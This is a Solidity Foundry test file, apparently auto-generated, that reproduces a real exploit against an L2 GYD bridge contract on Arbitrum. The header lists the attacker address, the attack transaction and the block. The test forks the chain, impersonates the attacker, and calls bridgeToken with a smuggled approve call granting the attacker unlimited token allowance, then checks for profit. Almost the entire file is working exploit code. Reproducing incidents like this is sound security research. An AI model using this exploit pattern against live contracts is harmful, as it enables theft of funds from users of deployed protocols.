// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x7dd4075a6eae9f18309f112364f0394c2dfa8102
// Attack Contract : 0xca5d8f8a8d49439357d3cf46ca2e720702f132b8
// Vulnerable Contract : 0xca5d8f8a8d49439357d3cf46ca2e720702f132b8
// Attack Tx : 0x51c22898a9b9f519a10b0a0be89b9d51c0248adb80cc0f89e57437e15e6c60c7
// Block : 426912214
// Chain : Arbitrum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : unpriced_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.AttackContract;
    address constant BRIDGE_RECIPIENT = Addresses.BridgeRecipient;
    uint64 constant BRIDGE_CHAIN_SELECTOR = 5009297550715157269;
    uint256 constant BRIDGE_AMOUNT = 1;
    uint256 constant FORK_BLOCK = 426912213;
    uint256 constant TX_TIMESTAMP = 1769803671;
    uint256 constant TX_BLOCK_NUMBER = 426912214;
    uint256 constant TX_VALUE = 746483725476321;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfit(ATTACK_CONTRACT, address(0));

        bytes memory tokenApprovalCall =
            abi.encodeWithSelector(IERC20Like.approve.selector, ATTACKER_EOA, type(uint256).max);
        IL2GydBridge(ATTACK_CONTRACT).bridgeToken{value: TX_VALUE}(
            BRIDGE_CHAIN_SELECTOR, BRIDGE_RECIPIENT, BRIDGE_AMOUNT, tokenApprovalCall
        );

        vm.stopPrank();
        _assertProfit();
    }

    function _expectProfitLegs(address attack, address attackChild) internal pure override {
        attack;
        attackChild;
        return;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x7DD4075A6eAe9f18309F112364f0394C2DfA8102;
    address internal constant AttackContract = 0xCA5d8F8a8d49439357d3CF46Ca2e720702F132b8;
    address internal constant BridgeRecipient = 0xe07F9D810a48ab5c3c914BA3cA53AF14E4491e8A;
}

interface IL2GydBridge {
    function bridgeToken(uint64, address, uint256, bytes calldata) external payable;
}
